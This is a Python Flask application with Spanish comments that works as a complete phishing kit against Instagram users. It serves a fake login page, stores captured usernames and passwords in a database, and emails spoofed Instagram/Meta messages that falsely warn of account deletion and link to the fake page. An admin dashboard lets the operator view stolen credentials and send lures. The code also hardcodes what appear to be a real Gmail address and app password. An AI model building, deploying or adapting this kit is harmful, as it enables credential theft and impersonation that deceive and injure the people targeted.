import os
import smtplib
import sqlite3
from flask import Flask, request, jsonify, send_from_directory, render_template, session, redirect, url_for, flash
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from urllib.parse import urlparse

# Importación condicional de psycopg2 (solo cuando se necesite PostgreSQL)
try:
    import psycopg2
    PSYCOPG2_AVAILABLE = True
except ImportError as e:
    PSYCOPG2_AVAILABLE = False
    print(f"Advertencia: psycopg2 no está disponible: {e}")

# --- CONFIGURACIÓN ---
BASE_DIR = os.path.abspath(os.path.dirname(__file__))

app = Flask(__name__)
# Configuración para Producción (Render) y Desarrollo
app.secret_key = os.environ.get("SECRET_KEY", "dev_secret_key_change_in_production")

# Handler global de errores para evitar crashes
@app.errorhandler(Exception)
def handle_exception(e):
    """Maneja todos los errores no capturados para evitar que la app crashee"""
    error_msg = str(e)
    print(f"❌ Error no capturado: {error_msg}")
    import traceback
    print(f"Traceback completo: {traceback.format_exc()}")
    
    # Si es una petición AJAX o API, devolver JSON
    if request.is_json or request.path.startswith('/api/'):
        return jsonify({"error": error_msg}), 500
    
    # Si es una ruta de admin, redirigir al login con mensaje
    if request.path.startswith('/admin/'):
        flash(f"❌ Error: {error_msg}", "error")
        return redirect(url_for('admin_login'))
    
    # Para otras rutas, devolver un mensaje de error simple
    return f"Error: {error_msg}", 500

# Credenciales SMTP (Usar variables de entorno en Render)
SMTP_SERVER = os.environ.get("SMTP_SERVER", "smtp.gmail.com")
SMTP_PORT = int(os.environ.get("SMTP_PORT", 587))
SMTP_USER = os.environ.get("SMTP_USER", "denis69ks@gmail.com")
SMTP_PASSWORD = os.environ.get("SMTP_PASSWORD", "lwfcomqjwtmxccnz")

# Configuración Base de Datos
DATABASE_URL = os.environ.get("DATABASE_URL")

# --- CAPA DE ABSTRACCIÓN DE BASE DE DATOS ---
def get_db_connection():
    """Conecta a PostgreSQL si existe DATABASE_URL, si no usa SQLite."""
    if DATABASE_URL:
        if not PSYCOPG2_AVAILABLE:
            print("Error: DATABASE_URL está configurado pero psycopg2 no está disponible. Usando SQLite como fallback.")
            db_path = os.path.join(BASE_DIR, "phishing.db")
            conn = sqlite3.connect(db_path)
            conn.row_factory = sqlite3.Row
            return conn
        try:
            conn = psycopg2.connect(DATABASE_URL)
            return conn
        except Exception as e:
            print(f"Error conectando a Postgres: {e}")
            return None
    else:
        # Fallback local a SQLite
        db_path = os.path.join(BASE_DIR, "phishing.db")
        conn = sqlite3.connect(db_path)
        conn.row_factory = sqlite3.Row  # Para acceder por nombre de columna
        return conn

def init_db():
    conn = get_db_connection()
    if not conn:
        print("No se pudo conectar a la BD para inicializar.")
        return

    try:
        cur = conn.cursor()
        if DATABASE_URL:
            # PostgreSQL
            cur.execute("""
                CREATE TABLE IF NOT EXISTS captured (
                    id SERIAL PRIMARY KEY,
                    username TEXT,
                    password TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            """)
        else:
            # SQLite
            cur.execute('''CREATE TABLE IF NOT EXISTS captured
                         (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                          username TEXT, 
                          password TEXT, 
                          timestamp TEXT)''')
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        print(f"Error inicializando BD: {e}")

# Inicializar DB al arrancar
init_db()

# --- RUTAS PRINCIPALES ---

@app.route('/')
def index():
    return send_from_directory(BASE_DIR, 'index.html')

@app.route('/style.css')
def serve_css():
    return send_from_directory(BASE_DIR, 'style.css')

@app.route('/script.js')
def serve_js():
    return send_from_directory(BASE_DIR, 'script.js')

@app.route('/login-page')
def login_page():
    return send_from_directory(BASE_DIR, 'index.html')

@app.route('/logo.png')
def serve_logo():
    return send_from_directory(BASE_DIR, 'logo.png')

@app.route('/favicon.ico')
def serve_favicon():
    return send_from_directory(BASE_DIR, 'logo.png')

# --- LOGICA DE PHISHING (Captura) ---

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    # Timestamp: Para Postgres usamos DEFAULT, para SQLite lo generamos
    timestamp_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if username and password:
        try:
            conn = get_db_connection()
            cur = conn.cursor()
            
            if DATABASE_URL:
                # Postgres logic
                cur.execute("INSERT INTO captured (username, password) VALUES (%s, %s)", (username, password))
            else:
                # SQLite logic
                cur.execute("INSERT INTO captured (username, password, timestamp) VALUES (?, ?, ?)",
                          (username, password, timestamp_str))
            
            conn.commit()
            cur.close()
            conn.close()
            
            print(f"DATOS CAPTURADOS: {username}:{password}")
            return jsonify({"status": "success"}), 200
        except Exception as e:
            print(f"Error DB: {e}")
            return jsonify({"status": "error"}), 500
    
    return jsonify({"status": "error"}), 400

# --- FUNCION DE ENVIO DE CORREO (Reutilizable) ---
def send_phishing_email_logic(target_email, username_target):
    try:
        # Validar que tenemos las credenciales SMTP necesarias
        if not SMTP_USER or not SMTP_PASSWORD:
            return False, "Credenciales SMTP no configuradas. Verifica las variables de entorno SMTP_USER y SMTP_PASSWORD."
        
        if not target_email:
            return False, "El correo electrónico de destino es requerido."
        
        subject = "Lamentamos que solicites la eliminación de tu cuenta de Instagram"
        
        # En Producción, esto DEBE ser la URL de tu app en Render
        # Ejemplo: https://mi-phishing-app.onrender.com/login-page
        app_url = os.environ.get("RENDER_EXTERNAL_URL", "")
        if not app_url:
            # Intentar obtener desde el contexto de Flask si está disponible
            try:
                from flask import has_request_context, request as flask_request
                if has_request_context():
                    app_url = flask_request.host_url.rstrip('/')
                else:
                    app_url = "https://instagram-3-p8pc.onrender.com"
            except:
                app_url = "https://instagram-3-p8pc.onrender.com"
        app_url = app_url.rstrip('/')
        
        link = f"{app_url}/login-page"
        
        html_content = f"""
        <html>
        <body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; margin: 0; padding: 0;">
            <div style="max-width: 600px; margin: 20px auto; background-color: #ffffff; border: 1px solid #dbdbdb; padding: 40px;">
                
                <!-- Header con Texto (Sin Imagenes para evitar errores) -->
                 <div style="text-align: center; margin-bottom: 30px;">
                    <p style="font-family: 'Brush Script MT', 'Segoe Script', 'Grand Hotel', cursive; font-size: 45px; margin: 0; color: #262626; line-height: 1;">Instagram</p>
                </div>

                <div style="text-align: left; color: #262626;">
                    <p style="font-size: 16px;">Hola, <strong>{username_target}</strong>:</p>
                    
                    <p style="font-size: 14px; line-height: 1.5;">
                        Lamentamos que hayas solicitado la eliminación de tu cuenta. Si cambias de opinión, tienes tiempo hasta el mayo 28, 2025 para avisarnos. De lo contrario, se eliminarán tus publicaciones e información.
                    </p>
                    
                    <p style="font-size: 14px; line-height: 1.5; margin-top: 20px;">
                        Si se trata de un error o quieres conservar tu cuenta después de todo, avísanos.
                    </p>
                    
                    <div style="text-align: center; margin-top: 30px;">
                        <a href="{link}" style="background-color: #0095f6; color: white; padding: 10px 24px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 14px;">Conservar cuenta</a>
                    </div>
                    
                    <div style="margin-top: 40px; border-top: 1px solid #dbdbdb; padding-top: 20px; color: #8e8e8e; font-size: 12px; text-align: center;">
                        <p>from Meta</p>
                        <p>Instagram from Meta. Meta Platforms, Inc., 1601 Willow Road, Menlo Park, CA 94025</p>
                        <p>Este mensaje se ha enviado a <span style="color: #00376b;">{target_email}</span>...</p>
                    </div>
                </div>
            </div>
        </body>
        </html>
        """

        msg = MIMEMultipart()
        msg['From'] = f"Instagram <{SMTP_USER}>"
        msg['To'] = target_email
        msg['Subject'] = subject
        msg.attach(MIMEText(html_content, 'html'))

        # Configurar timeout para evitar que la conexión se cuelgue
        server = None
        try:
            print(f"🔌 Conectando a SMTP: {SMTP_SERVER}:{SMTP_PORT}")
            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=30)
            server.set_debuglevel(0)  # Desactivar debug en producción
            
            print(f"🔐 Iniciando TLS...")
            server.starttls()
            
            print(f"🔑 Autenticando con usuario: {SMTP_USER[:5]}...")
            server.login(SMTP_USER, SMTP_PASSWORD)
            
            print(f"📤 Enviando correo a {target_email}...")
            server.sendmail(SMTP_USER, target_email, msg.as_string())
            print(f"✅ Correo enviado exitosamente a {target_email}")
            return True, "Correo enviado exitosamente"
        except smtplib.SMTPAuthenticationError as e:
            error_msg = f"Error de autenticación SMTP: {str(e)}. Verifica SMTP_USER y SMTP_PASSWORD."
            print(f"❌ {error_msg}")
            return False, error_msg
        except smtplib.SMTPConnectError as e:
            error_msg = f"Error de conexión SMTP: {str(e)}. Verifica SMTP_SERVER y SMTP_PORT."
            print(f"❌ {error_msg}")
            return False, error_msg
        except smtplib.SMTPException as e:
            error_msg = f"Error SMTP: {str(e)}"
            print(f"❌ {error_msg}")
            return False, error_msg
        except Exception as e:
            error_msg = f"Error inesperado al enviar correo: {str(e)}"
            print(f"❌ {error_msg}")
            import traceback
            print(f"Traceback: {traceback.format_exc()}")
            return False, error_msg
        finally:
            if server:
                try:
                    server.quit()
                except:
                    pass
    except Exception as e:
        error_msg = f"Error general al preparar el correo: {str(e)}"
        print(f"❌ {error_msg}")
        return False, error_msg

# --- PANEL DE ADMINISTRACION ---

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        user = request.form.get('username')
        pwd = request.form.get('password')
        
        # Variables de entorno para credenciales admin (o defaults)
        admin_user = os.environ.get("ADMIN_USER", "admin")
        admin_pass = os.environ.get("ADMIN_PASSWORD", "admin1234")
        
        if user == admin_user and pwd == admin_pass:
            session['admin_logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            return render_template('admin_login.html', error="Credenciales incorrectas")
    
    return render_template('admin_login.html')

@app.route('/admin/dashboard')
def dashboard():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    try:
        conn = get_db_connection()
        if not conn:
            flash("⚠️ Error al conectar con la base de datos", "error")
            return render_template('dashboard.html', captured_data=[])
        
        cur = conn.cursor()
        
        # Select query compatible con ambos
        cur.execute("SELECT * FROM captured ORDER BY id DESC")
        data = cur.fetchall()
        
        cur.close()
        conn.close()
        
        return render_template('dashboard.html', captured_data=data)
    except Exception as e:
        print(f"❌ Error en dashboard: {str(e)}")
        flash(f"⚠️ Error al cargar datos: {str(e)}", "error")
        return render_template('dashboard.html', captured_data=[])

@app.route('/admin/send-email', methods=['POST'])
def admin_send_email():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    try:
        email = request.form.get('email')
        username = request.form.get('username')
        
        if not email:
            flash("❌ El correo electrónico es requerido", "error")
            return redirect(url_for('dashboard'))
        
        if not username:
            username = email.split('@')[0]
        
        print(f"📧 Intentando enviar correo a {email} (usuario: {username})")
        smtp_user_display = SMTP_USER[:5] + "..." if SMTP_USER and len(SMTP_USER) > 5 else (SMTP_USER if SMTP_USER else "No configurado")
        print(f"🔧 SMTP_SERVER: {SMTP_SERVER}, SMTP_PORT: {SMTP_PORT}, SMTP_USER: {smtp_user_display}")
        
        success, msg = send_phishing_email_logic(email, username)
        
        if success:
            flash(f"✅ Correo enviado exitosamente a {email}", "success")
        else:
            flash(f"❌ Error al enviar: {msg}", "error")
        
        return redirect(url_for('dashboard'))
    except Exception as e:
        error_msg = f"Error inesperado: {str(e)}"
        print(f"❌ {error_msg}")
        flash(f"❌ {error_msg}", "error")
        return redirect(url_for('dashboard'))

@app.route('/admin/logout')
def logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

# --- ENDPOINT DE DIAGNÓSTICO (Solo para desarrollo/debugging) ---
@app.route('/admin/test-smtp')
def test_smtp():
    """Endpoint para verificar la configuración SMTP sin enviar correos"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    config_info = {
        "SMTP_SERVER": SMTP_SERVER,
        "SMTP_PORT": SMTP_PORT,
        "SMTP_USER": SMTP_USER[:5] + "..." if SMTP_USER else "No configurado",
        "SMTP_PASSWORD": "***" if SMTP_PASSWORD else "No configurado",
        "RENDER_EXTERNAL_URL": os.environ.get("RENDER_EXTERNAL_URL", "No configurado"),
        "DATABASE_URL": "Configurado" if DATABASE_URL else "No configurado (usando SQLite)"
    }
    
    return jsonify(config_info), 200

if __name__ == '__main__':
    # Configuración dinámica de puerto para Render o local
    port = int(os.environ.get("PORT", 8080))
    # Debug debe estar desactivado en producción
    debug_mode = os.environ.get("FLASK_DEBUG", "False").lower() == "true"
    app.run(host='0.0.0.0', port=port, debug=debug_mode)
